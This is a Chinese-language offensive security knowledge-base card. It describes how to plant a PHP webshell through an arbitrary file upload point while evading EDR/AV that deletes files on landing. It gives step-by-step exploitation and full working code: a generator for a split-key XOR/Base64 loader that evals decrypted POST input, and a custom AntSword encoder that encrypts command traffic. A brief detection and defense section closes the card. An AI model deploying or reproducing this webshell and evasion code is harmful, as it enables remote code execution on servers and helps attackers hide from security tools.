---
id: web-generic-file-upload-xor-split-key-loader-antsword
title: 上传落地即删场景：分离密钥 XOR loader + 蚁剑自定义编码器落地 WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: split-key-xor-webshell-loader
tags:
- php
- webshell
- file-upload
- av-bypass
- waf-bypass
- xor
- antsword
- obfuscation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V63
  verified_at: '2026-11-05T12:27:57+08:00'
  notes: 已对照原文与图 38-44 核对：后台 uploadotherfile 任意上传（path=../、落地即删）、分离密钥 loader.php + 1.txt、XOR+Base64 载荷、POST 参数 c、蚁剑自定义 php 编码器、SLB 多主机需多次上传均与原文/截图一致；图 43/44 证实加密参数执行与蚁剑连接。卡内称“分片落地”仅为原文提及、未完整演示，已作为条件更苛刻的变体记录。原文未给 CMS/主机版本，未设置 affected_versions。未验证点：未本机复跑。
url: /docs/web/generic/file-upload/web-generic-file-upload-xor-split-key-loader-antsword/
draft: false
kb_aliases:
- 分离密钥 loader
- XOR 加密木马落地
- 上传秒删绕过
- 蚁剑自定义编码器 XOR
- loader.php + 1.txt
- EDR 查杀绕过上传
---

## 一句话结论

上传接口允许任意内容但落地文件会被 EDR/AV 秒删时，可上传一个“无敏感函数名、只有 Base64 密文 + XOR 循环 + eval”的 loader，并把解密密钥放在另一个普通文本文件中；loader 运行时读取密钥、解密内置 payload 再 eval，配合蚁剑自定义 XOR 编码器加密命令流量，可稳定落地并连接。

## 原理

- 明文一句话 `<?php eval($_POST[...]);?>` 或 `phpinfo();` 会命中静态特征，被主机防护/EDR 在上传落地后立即删除；但上传接口本身不校验内容/扩展名，文件可以先写入再被删。
- 分离密钥把“加密载荷”和“解密密钥”拆成两个文件：`loader.php` 只包含 `file_get_contents('1.txt')` 取密钥、对 Base64 密文做 XOR、`eval` 解密结果；`1.txt` 只是随机十六进制字符串，单独看没有恶意特征。静态扫描很难仅凭 loader 判断出完整恶意逻辑。
- XOR 是对称运算，客户端和服务端用同一密钥即可互相加解密；把服务端代码（或后续命令）用密钥 XOR 后 Base64 嵌入 loader，运行时还原。由于密文是高熵随机字节，基于关键字/字符串的检测难以命中。
- 命令流量同样用 XOR 加密：蚁剑自定义编码器把原始 payload 与同一密钥逐字节 XOR 后 Base64 放入 POST 参数 `c`；服务端 loader 解密后 eval。网络侧和请求体中都看不到明文命令或 PHP 敏感函数。
- 之所以有效：检测针对“落地文件的静态内容”和“明文流量”，而恶意语义在运行时才由两个普通文件组合产生；把密钥文件与 loader 分开也降低了单文件特征密度。
- 边界：若 EDR 对 `eval`、`file_get_contents` 或“上传后执行”行为做动态检测，仍可能拦截；若上传目录不可访问或文件被重命名，loader 无法运行；密钥文件需与 loader 同目录或路径可预测。

## 触发条件

- 存在允许任意内容/扩展名的上传点（或可绕过校验），落点位于 Web 可访问目录且 PHP 可执行。
- 目标 PHP 允许 `eval`、`file_get_contents`（或等价读取函数），未被 `disable_functions` 禁用。
- 主机有 EDR/AV 会对明文 WebShell 做落地查杀，但对分离密钥/加密 loader 未命中。
- 能上传至少两个文件（loader 与密钥文件），或能通过其他方式写入密钥文件。
- 使用支持自定义编码器的客户端（如蚁剑），能与服务端约定同一 XOR 密钥。

## 利用步骤

1. 先上传一个最小 `phpinfo();` 文件，确认上传点可用、落点路径可预测，以及文件是否被立即删除。
2. 选择随机密钥（如 16 字节十六进制字符串），编写要执行的 PHP 代码（如命令执行/文件管理），用密钥 XOR 后 Base64 编码。
3. 生成 `loader.php`：读取同目录 `1.txt` 的密钥、Base64 解码内置密文、逐字节 XOR 还原、`eval`；把 `1.txt` 写为密钥字符串。
4. 分别上传 `loader.php` 与 `1.txt` 到同一目录（若负载均衡到多台主机，需多次上传保证每台都有）。
5. 访问 `loader.php`，用同一密钥构造加密的 POST 参数 `c`，验证代码执行。
6. 在蚁剑中编写自定义编码器（对 `data['_']` 做 XOR + Base64，放入 `c`，删除 `_`），选择该编码器连接 loader，进行文件管理/命令执行。

## PoC

服务端 loader 生成（原文逻辑）：

```php
<?php
$code = <<<'PHPCODE'
$key = "3c6e0b8a9c15224a";
$enc = base64_decode($_POST['c']);
$cmd = "";
for($i=0; $i<strlen($enc); $i++) {
  $cmd .= chr(ord($enc[$i]) ^ ord($key[$i % strlen($key)]));
}
if($cmd !== "") { eval($cmd); }
PHPCODE;

$secret = "7867e125de24a24ffe5d1262bf8fe485";
function xor_crypt($data, $key) {
  $out = '';
  for ($i=0; $i<strlen($data); $i++) {
    $out .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
  }
  return $out;
}
$encrypted = base64_encode(xor_crypt($code, $secret));

$loader = '<?php
$k = trim(file_get_contents(dirname(__FILE__)."/1.txt"));
$k = preg_replace("/\s+/", "", $k);
if (!$k) die;
$d = base64_decode("' . $encrypted . '");
for($i=0;$i<strlen($d);$i++) $d[$i] = chr(ord($d[$i]) ^ ord($k[$i % strlen($k)]));
eval($d);
';
file_put_contents('loader.php', $loader);
file_put_contents('1.txt', $secret);
```

蚁剑编码器（`antData/encoders/php/encoder`）：

```javascript
'use strict';
module.exports = (pwd, data, ext) => {
  const key = '3c6e0b8a9c15224a';
  let code = data['_'];
  let encrypted = '';
  for (let i = 0; i < code.length; i++) {
    encrypted += String.fromCharCode(code.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  data['c'] = Buffer.from(encrypted, 'latin1').toString('base64');
  delete data['_'];
  return data;
};
```

说明：原文在宝塔 + 多主机 SLB 环境使用该 loader 与编码器成功落地并连接蚁剑（明文 `phpinfo();` 多次访问不到，加密 loader 稳定）；PoC 未在本会话执行。

## 变体与关联

- **RSA/其他加密**：用 RSA 私钥加密命令、公钥解密（见关联卡），或 AES/异或变体；核心是把敏感语义从落盘文件/明文流量移到运行时。
- **分片落地**：把 loader 拆成多个片段分别上传，运行时拼接；原文提到但未完整演示，属于条件更苛刻的变体。
- **密钥存放**：独立文件、环境变量、数据库、图片元数据；独立文件最简单，但需保证路径可读。
- **多主机/负载均衡**：SLB 后有多台主机时，需对每台重复上传，或使用共享存储；否则连接会随机失败。
- 关联：[[web-generic-file-upload-encrypted-webshell-av-bypass]]（加密 WebShell 基础）、[[web-php-rce-webshell-rsa-traffic-encoder]]（RSA 流量编码器）、[[web-php-rce-iterator-webshell-split-reassemble]]（拆分函数名免杀）。

## 检测与防御

- **检测**：上传目录出现 `loader.php` 与同目录随机十六进制文本文件；PHP 文件包含 `base64_decode` + XOR 循环 + `eval` 的组合；Web 进程频繁读取同目录小文本文件；POST 参数为高熵 Base64 且无常规业务字段；上传后立即访问新文件的请求。
- **防御**：上传接口严格白名单扩展名/内容类型，落点移出 Web 根并禁止 PHP 执行；对上传文件做内容扫描与动态沙箱检测；禁用 `eval`、`assert` 等危险函数；限制 Web 进程对同目录任意文件的读取；监控上传目录新增可执行文件与异常 `eval` 行为；EDR 对“上传后立即执行”的行为链做检测。
